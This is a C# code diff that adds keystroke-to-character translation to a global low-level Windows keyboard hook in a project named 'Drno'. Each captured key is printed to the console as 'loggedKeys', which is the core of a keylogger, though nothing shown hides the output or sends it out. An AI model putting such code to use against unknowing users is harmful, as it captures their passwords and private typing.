@@ -1,8 +1,9 @@
 ﻿using System;
 using System.Diagnostics;
 using System.Runtime.InteropServices;
+using System.Text;
 
-namespace drno.Libraries
+namespace Drno.Libraries
 {
     class Keyboard
     {
@@ -21,6 +22,19 @@ namespace drno.Libraries
 
         [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
         private static extern IntPtr GetModuleHandle(string lpModuleName);
+
+        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
+        private static extern int ToUnicodeEx(uint virtualKeyCode, uint scanCode, byte[] keyboardState, 
+            [Out, MarshalAs(UnmanagedType.LPWStr, SizeConst = 64)] StringBuilder receivingBuffer, int bufferSize, uint flags, IntPtr dwhkl);
+
+        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
+        static extern bool GetKeyboardState(byte[] lpKeyState);
+
+        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
+        static extern uint MapVirtualKey(uint uCode, uint uMapType);
+
+        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
+        static extern IntPtr GetKeyboardLayout(uint idThread);
 
         // Class object declarations below
         private LowLevelKeyboardProc keyboardProc;
@@ -54,10 +68,27 @@ namespace drno.Libraries
 
             if (nCode >= 0 && wParam == (IntPtr) WM_KEYDOWN || wParam == (IntPtr) WM_SYSKEYDOWN)
             {
-                int vkCode = Marshal.ReadInt32(lParam);
+                uint vkCode = (uint) Marshal.ReadInt32(lParam);
+                string loggedKeys = getCharsFromVkCode(vkCode);
+                Console.Write(loggedKeys);
             }
 
             return CallNextHookEx(hookId, nCode, wParam, lParam);
+        }
+
+        public string getCharsFromVkCode(uint vkCode)
+        {
+            var buffer = new StringBuilder(256);
+            var keyboardState = new byte[256];
+            bool bKeyStateStatus = GetKeyboardState(keyboardState);
+
+            if (!bKeyStateStatus)
+                return "";
+            uint lScanCode = MapVirtualKey(vkCode, 0);
+            IntPtr hkl = GetKeyboardLayout(0);
+
+            ToUnicodeEx(vkCode, lScanCode, keyboardState, buffer, 256, 0, hkl);
+            return buffer.ToString();
         }
     }
 }
